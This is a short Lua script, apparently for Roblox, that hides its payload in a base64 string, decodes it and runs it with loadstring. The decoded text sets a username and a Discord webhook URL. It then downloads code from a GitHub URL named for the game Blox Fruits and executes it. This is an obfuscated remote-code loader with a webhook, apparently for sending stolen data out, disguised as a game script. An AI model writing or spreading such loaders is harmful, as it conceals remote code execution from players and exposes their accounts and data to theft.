
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gIlRoZU9ubHlUZW11dW4iCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NzY2Mzc3NjE3ODE3NjIwMi92RkhycTdjOXFoMVJIS0V1TGNlRlJCZVpTRHZMY0hiYmdKaDVsNjgzNTd5VFBwVW1weTZlWmM1ajg5RGg0OF9tREtJbSIKCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMjE0RWxpL2Jsb3gtZnJ1aXQvcmVmcy9oZWFkcy9tYWluL2Jsb3hmcnVpdCIsIHRydWUpKSgp"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()